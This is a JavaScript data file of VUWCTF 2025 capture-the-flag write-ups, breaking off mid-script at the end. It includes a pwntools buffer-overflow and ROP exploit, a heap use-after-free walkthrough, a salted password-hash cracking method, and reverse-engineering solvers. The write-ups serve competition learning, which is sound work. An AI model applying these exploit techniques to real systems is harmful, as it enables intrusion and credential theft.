const ctfData = {
    "VUWCTF 2025": {
        "rank": "26th place",
        "description": "University-level competition with emphasis on practical security challenges.",
        "challenges": [
            {
                "id": "automatoncsc",
                "title": "AutomatonCSC",
                "category": "Miscellaneous",
                "tags": [
                    "http"
                ],
                "writeup": "<p>Go to https://automatoncsc.challenges.2025.vuwctf.com/robots.txt/ You will find /robotnics_home_7x9k2m/ then just go to https://automatoncsc.challenges.2025.vuwctf.com/robotnics_home_7x9k2m/ In the source you will find another subdomain that leads to flag.txt https://automatoncsc.challenges.2025.vuwctf.com/robotnics_home_7x9k2m/flag.txt Flag: VuwCTF{We_love_you_NZCSC!!!}</p>"
            },
            {
                "id": "classy_people_dont_debug",
                "title": "Classy_People_Dont_Debug",
                "category": "Reverse Engineering",
                "tags": [
                    "stack",
                    "wireshark",
                    "shark"
                ],
                "writeup": "<h3>1. Initial Reconnaissance</h3>\n<p>We started with basic file analysis using <code>checksec</code>:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nArch:     amd64-64-little\n\nRELRO:    Partial RELRO\n\nStack:    Canary found\n\nNX:       NX enabled\n\nPIE:      PIE enabled\n\n</code></pre>\n<p>Running <code>strings</code> revealed aggressive environment scanning. The binary searches for strings like <code>gdb</code>, <code>frida</code>, <code>strace</code>, <code>wireshark</code>, and <code>ida</code> in <code>/proc</code> and loaded libraries. This confirmed that running the binary would likely trigger a trap or fake execution path.</p>\n<h3>2. Static Analysis</h3>\n<p>We opened the binary in <strong>Binary Ninja</strong> to analyze the control flow.</p>\n<h4>The \"Minefield\" (Anti-Debug)</h4>\n<p>The <code>.rodata</code> section contained a list of forbidden tools (<code>0x404022</code> - <code>0x40410b</code>). The entry point logic verified the environment against these strings. If any were found, the program would likely alter its state or exit.</p>\n<h4>The Main Verification Loop</h4>\n<p>We located the main logic by tracing the \"Correct!\" string (<code>0x404437</code>). This led us to a loop in <code>main</code> that iterates <strong>33 times</strong> (length of the flag).</p>\n<p>The loop performed the following operations:</p>\n<ol>\n<li><strong>Extraction:</strong> It extracted a byte from a large data blob at <code>0x404180</code> using a <strong>stride of 6</strong> (e.g., <code>blob[i * 6]</code>).</li>\n</ol>\n<ol>\n<li><strong>Transformation:</strong> It passed the index <code>i</code> and the extracted byte to a function <code>sub_402f88</code>.</li>\n</ol>\n<ol>\n<li><strong>Comparison:</strong> The result of the transformation was compared against the user's input character.</li>\n</ol>\n<h4>Reversing the Math (<code>sub_402f88</code>)</h4>\n<p>The transformation function <code>sub_402f88</code> was obfuscated with helper functions for basic arithmetic (<code>sub_4038c0</code> for <code>*</code>, <code>sub_403aaa</code> for <code>^</code>, etc.). By analyzing the arguments, we reconstructed the equation:</p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nFlagChar = EncryptedByte ^ Term1 ^ Term2 ^ Term3\n\n</code></pre>\n<p>Where:</p>\n<ul>\n<li><code>EncryptedByte</code> = <code>blob[i * 6]</code></li>\n</ul>\n<ul>\n<li><code>Term1</code> = <code>(i * 13) + 193</code></li>\n</ul>\n<ul>\n<li><code>Term2</code> = <code>(i * 5) + 163</code></li>\n</ul>\n<ul>\n<li><code>Term3</code> = <code>SBox[i % 64]</code> (Looked up from a secondary blob at <code>0x404120</code>)</li>\n</ul>\n<h3>3. The Solution</h3>\n<p>Since the logic was deterministic and relied only on the index <code>i</code> and hardcoded data blobs, we wrote a Python script to emulate the verification function and generate the flag.</p>\n<p><strong>Solver Script:</strong></p>\n<p>Python</p>\n<pre><code class=\"\">\n# VuwCTF 'Classy' Solver\n\n\n\n# 1. The S-Box (Data at 0x404120)\n\nsbox = [\n\n    0x10, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x90, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xfa, 0x0f,\n\n    0x11, 0x21, 0x31, 0x41, 0x51, 0x61, 0x71, 0x81, 0x92, 0xa2, 0xb2, 0xc2, 0xd2, 0xe2, 0xf2, 0x02,\n\n    0x13, 0x23, 0x33, 0x43, 0x53, 0x63, 0x73, 0x83, 0x94, 0xa4, 0xb4, 0xc4, 0xd4, 0xe4, 0xf4, 0x04,\n\n    0x15, 0x25, 0x35, 0x45, 0x55, 0x65, 0x75, 0x85, 0x96, 0xa6, 0xb6, 0xc6, 0xd6, 0xe6, 0xf6, 0x06\n\n]\n\n\n\n# 2. The Encrypted Blob (Data at 0x404180)\n\nencrypted_blob = bytes([\n\n    0x24, 0x41, 0x44, 0x64, 0x45, 0x5b, 0x31, 0x56, 0x22, 0x69, 0x5d, 0x58, \n\n    0x32, 0x16, 0x7f, 0x5d, 0x5e, 0x90, 0x5d, 0x0b, 0x5c, 0x58, 0x54, 0x71, \n\n    0x43, 0x5a, 0xba, 0x5b, 0x66, 0x58, 0x9e, 0xbc, 0x4c, 0x58, 0x5a, 0x6b, \n\n    0xc2, 0x52, 0x5b, 0x6f, 0x79, 0x03, 0x24, 0x63, 0x5f, 0x69, 0x03, 0x19, \n\n    0x17, 0x4d, 0x6b, 0x1d, 0x6f, 0xa5, 0x3f, 0x58, 0x6c, 0x60, 0x44, 0xa2, \n\n    0x53, 0x64, 0x60, 0x44, 0xa2, 0x62, 0x18, 0x6d, 0x43, 0x67, 0x61, 0x76, \n\n    0x3f, 0x61, 0x65, 0x7f, 0x60, 0xb3, 0x0d, 0x66, 0x8e, 0x6f, 0xb2, 0xa1, \n\n    0x05, 0x84, 0x69, 0xa4, 0xb3, 0xfe, 0x16, 0x61, 0xb4, 0xa3, 0xfe, 0xd5,\n\n    0x00, 0x45, 0xa4, 0xf7, 0xe6, 0xf9, 0x3e, 0x94, 0xe7, 0xfe, 0xf9, 0x98, \n\n    0x38, 0xfa, 0xf9, 0xbc, 0x9b, 0x7e, 0x9f, 0xe1, 0xbc, 0x9b, 0x7e, 0x76,\n\n    0xa3, 0xbe, 0xbd, 0x70, 0x44, 0x71, 0x98, 0xbf, 0x42, 0x5a, 0x77, 0x00, \n\n    0xd1, 0x79, 0x5b, 0x60, 0x71, 0x8e, 0x0f, 0x41, 0x76, 0x87, 0x8c, 0x95, \n\n    0x2f, 0x86, 0x87, 0xf4, 0x85, 0xaa, 0xb2, 0x95, 0xe2, 0x8b, 0x88, 0x89, \n\n    0xeb, 0xea, 0xcb, 0x88, 0x89, 0x6e, 0xbd, 0xc3, 0x88, 0x89, 0x6e, 0x36,\n\n    0x8f, 0xed, 0x8e, 0x13, 0x05, 0x10, 0x9f, 0x8e, 0x03, 0x0d, 0x10, 0x03,\n\n    0xbf, 0x09, 0x0b, 0x26, 0x31, 0x5c, 0x5b, 0x03, 0x16, 0x01, 0x5c, 0x57,\n\n    0x4c, 0x05, 0x04, 0x53, 0x42, 0x99\n\n])\n\n\n\nflag = \"\"\n\n\n\nfor i in range(33):\n\n    enc_byte = encrypted_blob[i * 6]\n\n    term1 = (i * 13) + 193\n\n    term2 = (i * 5) + 163\n\n    term3 = sbox[i % 64]\n\n    \n\n    # Decrypt\n\n    decrypted_char = (enc_byte ^ term1 ^ term2 ^ term3) &amp; 0xFF\n\n    flag += chr(decrypted_char)\n\n\n\nprint(f\"Flag: {flag}\")\n\n</code></pre>\n<h3>4. Flag</h3>\n<p><code>VuwCTF{very_classy_d0'nt_6ou_s33}</code></p>"
            },
            {
                "id": "delicious-cooking",
                "title": "Delicious Cooking",
                "category": "Cryptography",
                "tags": [
                    "crack"
                ],
                "writeup": "<h4><strong>1. Reconnaissance</strong></h4>\n<p>First, we searched the provided database dump for the target username, <code>meatballfan19274</code>.</p>\n<ul>\n<li><strong>User:</strong> <code>meatballfan19274</code></li>\n</ul>\n<ul>\n<li><strong>Hash:</strong> <code>09be2259e0224f41b96b633b73e7138b50b4be0a1ae20c0eb6a7434e8fc47303</code></li>\n</ul>\n<ul>\n<li><strong>Salt:</strong> <code>334aa758c52bb2f862f1607ff098e954</code></li>\n</ul>\n<ul>\n<li><strong>Security Hint:</strong> \"I refuse to use security questions for security reasons\"</li>\n</ul>\n<p>The security hint for this specific user was unhelpful. However, because this is a database dump, we can look for patterns across other users.</p>\n<h4><strong>2. Pattern Analysis (The \"Shared Hash\" Vulnerability)</strong></h4>\n<p>We searched for other users in the database who had the <strong>exact same password hash</strong> (<code>09be...</code>) and <strong>salt</strong> (<code>334aa...</code>). If the hash and salt are identical, the password must be identical.</p>\n<p>We found several users sharing this hash, which gave us new security hints to analyze:</p>\n<ol>\n<li><strong><code>steaksaucer28087</code>:</strong> \"Anyone can cook\"</li>\n</ol>\n<ul>\n<li><strong><code>icecreammaniac54990</code>:</strong> \"Anyone can cook\"</li>\n</ul>\n<ul>\n<li><strong><code>sodageek66653</code>:</strong> \"Anyone can cook\"</li>\n</ul>\n<ul>\n<li><strong><code>lasangelover47954</code>:</strong> <strong>\"fav movie + bank pin\"</strong></li>\n</ul>\n<h4><strong>3. Deduction</strong></h4>\n<p>The hints provided the pieces needed to construct the password:</p>\n<ul>\n<li><strong>\"fav movie\":</strong> The phrase \"Anyone can cook\" is the famous motto from the Pixar movie <strong>_Ratatouille_</strong>. Other users in the database also used quotes from this movie (e.g., \"Change is nature, dad\" and \"One can get too familiar with vegetables, you know\" ).</li>\n</ul>\n<ul>\n<li><strong>\"bank pin\":</strong> This implies a 4-digit number appended to the movie title.</li>\n</ul>\n<p><strong>Hypothesis:</strong> The password is likely <code>ratatouille</code> followed by 4 digits (e.g., <code>ratatouille0000</code> to <code>ratatouille9999</code>).</p>\n<h4><strong>4. Exploit (Cracking the Hash)</strong></h4>\n<p>We performed a targeted brute-force attack using the derived pattern.</p>\n<ul>\n<li><strong>Attack Mode:</strong> Dictionary/Mask Attack</li>\n</ul>\n<ul>\n<li><strong>Candidates:</strong> <code>ratatouille0000</code> - <code>ratatouille9999</code></li>\n</ul>\n<ul>\n<li><strong>Salt Interpretation:</strong> The 32-character salt was hex-encoded. It needed to be decoded into raw bytes before hashing.</li>\n</ul>\n<ul>\n<li><strong>Hash Algo:</strong> SHA-256 (Mode 1410: <code>sha256($pass.$salt)</code>)</li>\n</ul>\n<p><strong>The Winning Combination:</strong></p>\n<ul>\n<li><strong>Candidate:</strong> <code>ratatouille6281</code></li>\n</ul>\n<ul>\n<li><strong>Salt (Hex-decoded):</strong> <code>0x334aa758c52bb2f862f1607ff098e954</code></li>\n</ul>\n<h4><strong>5. Flag</strong></h4>\n<p>The password for <code>meatballfan19274</code> is:</p>\n<p><strong><code>ratatouille6281</code></strong></p>"
            },
            {
                "id": "fortune-cookies",
                "title": "Fortune-Cookies",
                "category": "Miscellaneous",
                "tags": [
                    "http",
                    "cookie",
                    "crack"
                ],
                "writeup": "<h4>Challenge Description</h4>\n<p>> \"I'm really craving that fortune cookie feeling when you crack one open and read a message of 512 octets or fewer. I always need the best fortune, so I end up eating dozens of sugar-filled cookies at a time. Can you help?\" >  > <strong>Connect:</strong> <code>nc fortune-cookie.challenges.2025.vuwctf.com 17</code></p>\n<h4>Reconnaissance & Analysis</h4>\n<p>The challenge provides a hostname and a specific port: <strong>17</strong>.</p>\n<ol>\n<li><strong>Port Analysis:</strong> A quick check of standard ports reveals that TCP/UDP Port 17 is reserved for the <strong>Quote of the Day (QOTD)</strong> protocol (defined in <a href=\"https://tools.ietf.org/html/rfc865\" target=\"_blank\">RFC 865</a>).</li>\n</ol>\n<ol>\n<li><strong>Protocol Behavior:</strong> The QOTD protocol is very simple: when a client connects, the server sends a short message (limited to 512 characters/octets) and immediately closes the connection.</li>\n</ol>\n<ol>\n<li><strong>The Clue:</strong> The description mentions \"eating dozens\" of cookies to find the \"best fortune.\" This suggests that the server pulls from a randomized list of quotes, and the flag is simply one rare entry in that list.</li>\n</ol>\n<h4>Solution</h4>\n<p>To get the flag, we don't need to exploit a vulnerability. We simply need to automate \"eating\" the cookies (connecting repeatedly) until the flag is served.</p>\n<p>We can achieve this with a simple Bash one-liner that loops the <code>netcat</code> connection and <code>greps</code> for the flag format.</p>\n<p><strong>Exploit Script (Bash):</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">\nwhile true; do \n\n    nc fortune-cookie.challenges.2025.vuwctf.com 17 | grep \"VuwCTF{\" &amp;&amp; break\n\ndone\n\n</code></pre>\n<p><strong>Execution:</strong> The script loops infinitely. Most connections return a standard fortune cookie quote and are ignored by <code>grep</code>. Eventually, the server returns the flag, <code>grep</code> prints it to the console, and the loop breaks.</p>\n<h4>The Flag</h4>\n<p>Plaintext</p>\n<pre><code class=\"\">\nVuwCTF{om_nom_nom_bytes}\n\n</code></pre>"
            },
            {
                "id": "fruit-ninja",
                "title": "Fruit Ninja",
                "category": "Binary Exploitation",
                "tags": [
                    "heap",
                    "memory"
                ],
                "writeup": "<h3>1. Vulnerability Analysis</h3>\n<p>By analyzing the binary with GDB, we discovered two critical flaws:</p>\n<ol>\n<li><strong>Dangling Pointer (UAF):</strong> When selecting <strong>Option 2 (Throw away fruit)</strong>, the program frees the memory chunk but fails to clear the pointer in the <code>fruit_basket</code> array. This allows us to access and edit \"freed\" memory.</li>\n</ol>\n<ol>\n<li><strong>Heap Reuse:</strong> The <strong>Option 6 (Reset leaderboard)</strong> function allocates a new memory chunk of size <code>0x24</code> (padded to <code>0x30</code>). This is the exact same size as a \"Fruit\" chunk. Because the heap manager (glibc allocator) prioritizes recycling recently freed chunks (via the <code>tcache</code>), resetting the leaderboard will reuse the memory address of the most recently freed fruit.</li>\n</ol>\n<p><strong>The Win Condition:</strong> The function <code>perform_special_action</code> (Option 5) checks if the data inside the <code>leaderboard</code> matches the string <strong>\"Admin\"</strong>.</p>\n<h3>2. The Exploit Strategy</h3>\n<p>We can trick the program into making the <code>leaderboard</code> and our <code>fruit_basket</code> point to the <strong>same memory address</strong>. This allows us to use the \"Edit Fruit\" feature to overwrite the <code>leaderboard</code> data with \"Admin\".</p>\n<h3>3. Manual Execution Steps</h3>\n<p>Here is the exact sequence of inputs to solve the challenge manually (works on both local binary and remote server).</p>\n<h4>Step 1: Slice a Fruit (Allocation)</h4>\n<p>We create a fruit to reserve a chunk of memory on the heap.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>1</code></li>\n</ul>\n<ul>\n<li><strong>Fruit Name:</strong> <code>Trash</code> (Any name works here)</li>\n</ul>\n<ul>\n<li><strong>Points:</strong> <code>1</code></li>\n</ul>\n<h4>Step 2: Throw Away Fruit (Free)</h4>\n<p>We free the fruit we just created. The memory is released to the \"recycle bin,\" but our pointer to it (Index 0) remains active (dangling).</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>2</code></li>\n</ul>\n<ul>\n<li><strong>Index:</strong> <code>0</code></li>\n</ul>\n<h4>Step 3: Reset Leaderboard (Aliasing)</h4>\n<p>We choose to reset the leaderboard. The program requests memory. The allocator notices the chunk we just freed in Step 2 fits perfectly, so it gives that specific memory address to the <code>leaderboard</code>.</p>\n<ul>\n<li><strong>Crucial State:</strong> <code>fruit_basket[0]</code> and <code>leaderboard</code> now point to the <strong>same address</strong>.</li>\n</ul>\n<ul>\n<li><strong>Menu Choice:</strong> <code>6</code></li>\n</ul>\n<h4>Step 4: Overwrite Data</h4>\n<p>We use the \"Edit\" feature on the dangling fruit pointer. Since it points to the same place as the leaderboard, we are actually editing the leaderboard.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>4</code></li>\n</ul>\n<ul>\n<li><strong>Index:</strong> <code>0</code></li>\n</ul>\n<ul>\n<li><strong>New Name:</strong> <code>Admin</code></li>\n</ul>\n<ul>\n<li>_Note: This must be exact. Case-sensitive._</li>\n</ul>\n<h4>Step 5: Trigger Victory</h4>\n<p>Now that the leaderboard contains the string \"Admin\", we run the check.</p>\n<ul>\n<li><strong>Menu Choice:</strong> <code>5</code></li>\n</ul>\n<p><strong>Output:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nAdmin Welcome!\n\nFlag: VuwCTF{fr33_th3_h34p_sl1c3_th3_fr00t}\n\n</code></pre>\n<h3>Summary</h3>\n<p>This challenge is a textbook example of <strong>Heap Aliasing</strong>. By understanding that <code>malloc</code> recycles memory and that the program didn't clean up its pointers (<code>fruit_basket[0]</code>), we were able to control an internal program structure (<code>leaderboard</code>) using user-accessible controls (<code>edit_fruit</code>).</p>"
            },
            {
                "id": "missing-function",
                "title": "Missing Function",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "shellcode",
                    "stack",
                    "assembly",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are given a binary (<code>flag_verifier</code>) that asks for a flag input. Static analysis reveals that the validation logic is not present in the <code>.text</code> section. Instead, the program allocates executable memory, copies a blob of data into it, and executes that data as a function.</p>\n<h3>Step 1: Static Analysis</h3>\n<p>Opening the binary in a decompiler (Ghidra/Binary Ninja/IDA) reveals the following control flow in <code>main</code>:</p>\n<ol>\n<li>User input is read via <code>getline</code>.</li>\n</ol>\n<ol>\n<li><code>mmap</code> is called to allocate a memory region with permissions <code>7</code> (<strong>RWX</strong> - Read, Write, Execute).</li>\n</ol>\n<ol>\n<li><code>memcpy</code> moves a chunk of bytes from a global data section (<code>0x404020</code>) into this new memory.</li>\n</ol>\n<ol>\n<li>The program casts the allocated memory address to a function pointer and calls it: <code>rax_2(input_string, input_length)</code>.</li>\n</ol>\n<p>This confirms the binary is a <strong>Shellcode Runner</strong>. To solve it, we must analyze the code generated at runtime.</p>\n<h3>Step 2: Dynamic Analysis (Bypassing PIE)</h3>\n<p>Running <code>checksec</code> reveals that <strong>PIE (Position Independent Executable)</strong> is enabled, meaning memory addresses are randomized at every run. We cannot simply break at the static offset.</p>\n<p><strong>Strategy:</strong></p>\n<ol>\n<li>Run the program in GDB and let it load.</li>\n</ol>\n<ol>\n<li>Interrupt execution while it waits for input.</li>\n</ol>\n<ol>\n<li>Find the base address and calculate the offset to the shellcode invocation.</li>\n</ol>\n<p><strong>GDB Steps:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">\ngdb ./flag_verifier\n\n(gdb) start\n\n(gdb) continue\n\n# Program waits for input... Press Ctrl+C\n\n^C\n\n(gdb) info proc mappings\n\n</code></pre>\n<p>_We identified the Base Address (e.g., <code>0x555555554000</code>)._</p>\n<p>We located the <code>call</code> instruction at offset <code>0x134c</code>. <strong>Breakpoint Address:</strong> <code>Base Address + 0x134c</code>.</p>\n<h3>Step 3: Analyzing the Shellcode</h3>\n<p>After setting the breakpoint and providing dummy input (<code>AAAA</code>), we stepped (<code>si</code>) into the mapped memory.</p>\n<p>Disassembling the shellcode (<code>x/20i $pc</code>) revealed the following logic:</p>\n<h4>1. Length Check</h4>\n<p>Code snippet</p>\n<pre><code class=\"\">\ncmpl   $0x1d,-0x4c(%rbp)  ; 0x1d = 29 decimal\n\nje     ...\n\n</code></pre>\n<p>The flag must be exactly <strong>29 characters</strong> long.</p>\n<h4>2. Data Loading</h4>\n<p>The code loads several 64-bit integers onto the stack using <code>movabs</code>. These represent the encrypted flag bytes in <strong>Little Endian</strong>.</p>\n<ul>\n<li><code>0x9ff8e6a5c0d784d5</code></li>\n</ul>\n<ul>\n<li><code>0xecc29cfad3aeedcf</code></li>\n</ul>\n<ul>\n<li>...and others.</li>\n</ul>\n<h4>3. Key Loading</h4>\n<p>The code initializes a rolling XOR key:</p>\n<p>Code snippet</p>\n<pre><code class=\"\">\nmovw   $0xf183,-0x33(%rbp)  ; Stores bytes 0x83, 0xF1\n\nmovb   $0xa0,-0x31(%rbp)    ; Stores byte  0xA0\n\n</code></pre>\n<p>Key: <code>[0x83, 0xF1, 0xA0]</code></p>\n<h4>4. Decryption Loop</h4>\n<p>The loop logic was identified as:</p>\n<ol>\n<li>Load encrypted byte.</li>\n</ol>\n<ol>\n<li>Load key byte (cycling through the 3-byte key).</li>\n</ol>\n<ol>\n<li>XOR them (<code>encrypted ^ key</code>).</li>\n</ol>\n<ol>\n<li>Compare result with user input.</li>\n</ol>\n<h3>Step 4: Solving</h3>\n<p>We extracted the encrypted bytes and the key from the assembly and wrote a Python script to replicate the XOR decryption.</p>\n<p><strong>Solution Script:</strong></p>\n<p>Python</p>\n<pre><code class=\"\">\n#!/usr/bin/env python3\n\n\n\n# Key extracted from assembly (Little Endian: 0xf183 -&gt; 83 f1)\n\n# Key sequence: 83 F1 A0\n\nkey = [0x83, 0xF1, 0xA0]\n\n\n\n# Encrypted chunks extracted from 'movabs' instructions\n\n# We convert them to bytes (Little Endian)\n\nchunks = [\n\n    0x9ff8e6a5c0d784d5,\n\n    0xecc29cfad3aeedcf,\n\n    0xc6aee0c99decc29c, # Note: This chunk overlapped in memory, \n\n    0x8cedcf98f7c39ff6  # but we reconstruct the stream based on offsets\n\n]\n\n\n\n# Reconstructing the raw byte stream\n\ndata = bytearray()\n\ndata.extend(chunks[0].to_bytes(8, 'little'))\n\ndata.extend(chunks[1].to_bytes(8, 'little')[:5]) # Take first 5 bytes to reach next offset\n\ndata.extend(chunks[2].to_bytes(8, 'little'))\n\ndata.extend(chunks[3].to_bytes(8, 'little'))\n\n\n\n# Decrypt\n\nflag = \"\"\n\nfor i in range(29): # We know length is 29\n\n    decrypted_char = data[i] ^ key[i % 3]\n\n    flag += chr(decrypted_char)\n\n\n\nprint(f\"Flag: {flag}\")\n\n</code></pre>\n<h3>Flag</h3>\n<p><code>VuwCTF{non_symbolic_function}</code></p>"
            },
            {
                "id": "tokaido",
                "title": "Tokaido",
                "category": "Binary Exploitation",
                "tags": [
                    "pwn",
                    "buffer",
                    "overflow",
                    "rop",
                    "stack",
                    "memory"
                ],
                "writeup": "<h3>1. Analysis</h3>\n<p>We are provided with a 64-bit ELF binary <code>tokaido</code> and its source code <code>tokaido.c</code>.</p>\n<h4>Source Code Review</h4>\n<p>The <code>main</code> function contains two critical elements:</p>\n<ol>\n<li><strong>Memory Leak:</strong> It prints the address of the <code>main</code> function itself (<code>printf(\"funny number: %p\\n\", main);</code>). This allows us to bypass ASLR/PIE protections.</li>\n</ol>\n<ul>\n<li><strong>Buffer Overflow:</strong> It uses <code>gets(buffer)</code> to read into a 16-byte buffer. Since <code>gets</code> does not check input length, we can overwrite the stack.</li>\n</ul>\n<p>The <code>win</code> function has a specific logic gate:</p>\n<p>C</p>\n<pre><code class=\"\">\nvoid win() {\n\n    puts(\"you win\");\n\n    if (attempts++ &gt; 0){\n\n        // prints flag...\n\n    } else {\n\n        puts(\"not attempted\");\n\n    }\n\n}\n\n</code></pre>\n<p>The flag is only printed if <code>attempts &gt; 0</code>. Since <code>attempts</code> starts at 0, calling <code>win()</code> once is insufficient. We must execute <code>win()</code> <strong>twice</strong> within the same exploit chain.</p>\n<h3>2. Exploitation Strategy</h3>\n<p>To exploit this, we use a <strong>Return-Oriented Programming (ROP)</strong> approach:</p>\n<ol>\n<li><strong>Calculate Offsets:</strong> We determine the static distance between <code>main</code> and <code>win</code> in the binary.</li>\n</ol>\n<ul>\n<li>Static <code>main</code>: <code>0x12ce</code></li>\n</ul>\n<ul>\n<li>Static <code>win</code>: <code>0x1229</code></li>\n</ul>\n<ol>\n<li><strong>Bypass ASLR:</strong> Capture the \"funny number\" leak at runtime, calculate the binary's base address, and determine the dynamic address of <code>win</code>.</li>\n</ol>\n<ol>\n<li><strong>Construct Payload:</strong></li>\n</ol>\n<ul>\n<li><strong>Padding:</strong> 16 bytes (Buffer) + 8 bytes (Saved RBP) = <strong>24 bytes</strong>.</li>\n</ul>\n<ul>\n<li><strong>Return Address 1:</strong> Address of <code>win</code> (Increments <code>attempts</code> to 1).</li>\n</ul>\n<ul>\n<li><strong>Return Address 2:</strong> Address of <code>win</code> (Checks <code>attempts &gt; 0</code> and prints flag).</li>\n</ul>\n<h3>3. Exploit Script</h3>\n<p>Here is the final python script using <code>pwntools</code> to solve the challenge remotely.</p>\n<p>Python</p>\n<pre><code class=\"\">\nfrom pwn import *\n\n\n\n# Context setup\n\nexe = './tokaido'\n\nelf = ELF(exe)\n\ncontext.binary = elf\n\n\n\n# Connect to server\n\n# r = process(exe) # For local testing\n\nr = remote(\"tokaido.challenges.2025.vuwctf.com\", 9983)\n\n\n\n# 1. Parse the Leak\n\nr.recvuntil(b\"funny number: \")\n\nleak = int(r.recvline().strip(), 16)\n\nlog.info(f\"Leaked main: {hex(leak)}\")\n\n\n\n# 2. Calculate Base Address\n\n# Formula: Base = Leak - Static_Main_Offset\n\nelf.address = leak - elf.symbols['main']\n\nlog.success(f\"Calculated Binary Base: {hex(elf.address)}\")\n\n\n\n# 3. Construct Payload\n\n# We need to call win() TWICE.\n\n# Layout: [Padding 24B] + [Address of Win] + [Address of Win]\n\npayload = b\"A\" * 24\n\npayload += p64(elf.symbols['win']) # First call: attempts -&gt; 1\n\npayload += p64(elf.symbols['win']) # Second call: prints flag\n\n\n\n# 4. Send &amp; Win\n\nr.sendline(payload)\n\nr.interactive()\n\n</code></pre>\n<h3>4. Flag</h3>\n<p><code>VuwCTF{eastern_sea_route}</code></p>"
            },
            {
                "id": "ng\u0101wari-vm",
                "title": "ng\u0101wari-vm",
                "category": "Reverse Engineering",
                "tags": [
                    "overflow",
                    "stack",
                    "reverse",
                    "assembly"
                ],
                "writeup": "<h3>1. Initial Analysis</h3>\n<p>We start by inspecting the provided files. <code>ngawari_vm</code> is the executable, and <code>flag_checker.txt</code> contains unintelligible text data.</p>\n<p>Running <code>strings</code> on the binary reveals that it is a \"generalized, programmable input checker\". Key strings include:</p>\n<ul>\n<li><code>Ngawari VM - A generalized, programmable input checker</code></li>\n</ul>\n<ul>\n<li><code>Required first line of file missing</code></li>\n</ul>\n<ul>\n<li><code>Input accepted!</code></li>\n</ul>\n<ul>\n<li><code>Stack overflow</code> / <code>Stack underflow</code></li>\n</ul>\n<p>This suggests the binary implements a stack-based virtual machine that reads <code>flag_checker.txt</code> as a set of rules.</p>\n<h3>2. Reverse Engineering the VM logic</h3>\n<p>Using <code>gdb</code> (GNU Debugger), we analyzed the <code>accept_input</code> function, which is the core execution loop. The disassembly revealed that the VM operates as a <strong>Pushdown Automaton (PDA)</strong>.</p>\n<p>A PDA is a theoretical machine that uses a <strong>Stack</strong> and a <strong>State</strong> to decide valid transitions. The disassembly showed that for every input character, the VM performs the following check:</p>\n<p>\u03b4(CurrentState,InputChar,PopStack)\u2192(NextState,PushString)</p>\n<p>Specifically, the VM reads instructions from <code>flag_checker.txt</code> and looks for a line that matches:</p>\n<ol>\n<li><strong>Current State:</strong> The VM's current state byte.</li>\n</ol>\n<ol>\n<li><strong>Input Character:</strong> The character you just typed.</li>\n</ol>\n<ol>\n<li><strong>Stack Top:</strong> The character popped from the top of the stack.</li>\n</ol>\n<p>If a match is found, the VM transitions to the <strong>Next State</strong> and pushes a defined string onto the stack.</p>\n<h3>3. Decoding <code>flag_checker.txt</code></h3>\n<p>With the logic understood, we can parse <code>flag_checker.txt</code>.</p>\n<h4>The Header</h4>\n<p>The first line of the file is <code>aBw</code>.</p>\n<ul>\n<li><code>a</code>: <strong>Initial State</strong>.</li>\n</ul>\n<ul>\n<li><code>B</code>: <strong>Initial Stack Symbol</strong> (The stack starts with this char).</li>\n</ul>\n<ul>\n<li><code>w</code>: <strong>Accepting State</strong> (The state we must reach to win).</li>\n</ul>\n<h4>The Instructions</h4>\n<p>Subsequent lines follow a specific format. Take the line <code>i_GoPHER</code> as an example:</p>\n<ul>\n<li><code>i</code>: <strong>Current State</strong> required.</li>\n</ul>\n<ul>\n<li><code>_</code>: <strong>Input Character</strong> required.</li>\n</ul>\n<ul>\n<li><code>G</code>: <strong>Stack Pop</strong> required (Must be at the top of the stack).</li>\n</ul>\n<ul>\n<li><code>o</code>: <strong>Next State</strong>.</li>\n</ul>\n<ul>\n<li><code>PHER</code>: <strong>String to Push</strong>.</li>\n</ul>\n<ul>\n<li>_Note:_ The VM loops through this string and pushes characters. Effectively, the first character of the string (<code>P</code>) becomes the new top of the stack.</li>\n</ul>\n<h3>4. Solving the Automaton</h3>\n<p>The complexity of the stack operations makes manual solving impossible. We need to find a path from the start state <code>a</code> (with stack <code>['B']</code>) to the target state <code>w</code>.</p>\n<p>We can solve this using a Breadth-First Search (BFS) algorithm in Python. The script simulates the PDA, tracking the <code>(State, Stack)</code> tuple to find the correct path.</p>\n<h4>The Solver Script</h4>\n<p>Python</p>\n<pre><code class=\"\">\nimport collections\n\n\n\ndef solve_vm():\n\n    # Load the bytecode\n\n    with open('flag_checker.txt', 'r') as f:\n\n        lines = [l.strip() for l in f.readlines() if l.strip()]\n\n\n\n    # Parse Header: aBw\n\n    # Init State: 'a', Init Stack: 'B', Target State: 'w'\n\n    header = lines[0]\n\n    init_state = header[0]\n\n    init_stack = (header[1],) # Represent stack as a tuple\n\n    target_state = header[2]\n\n\n\n    # Parse Transitions\n\n    transitions = []\n\n    for line in lines[1:]:\n\n        if len(line) &lt; 4: continue\n\n        # Format: [State][Input][Pop][NextState][PushStr...]\n\n        transitions.append({\n\n            'state': line[0],\n\n            'in_char': line[1],\n\n            'pop_char': line[2],\n\n            'next_state': line[3],\n\n            'push_str': line[4:] \n\n        })\n\n\n\n    # BFS Initialization\n\n    # Queue stores: (Current State, Current Stack Tuple, Path Taken)\n\n    queue = collections.deque([(init_state, init_stack, \"\")])\n\n    visited = set([(init_state, init_stack)])\n\n    \n\n    print(\"Searching for flag...\")\n\n\n\n    while queue:\n\n        curr_state, curr_stack, history = queue.popleft()\n\n\n\n        # The stack cannot be empty for a valid move\n\n        if not curr_stack:\n\n            continue\n\n            \n\n        # Get the top of the stack\n\n        top_of_stack = curr_stack[-1]\n\n        stack_body = curr_stack[:-1]\n\n\n\n        for t in transitions:\n\n            # Check if this transition applies\n\n            if t['state'] == curr_state and t['pop_char'] == top_of_stack:\n\n                \n\n                # Check for Win Condition\n\n                # The VM terminates input with a '^' char. \n\n                if t['in_char'] == '^':\n\n                    if 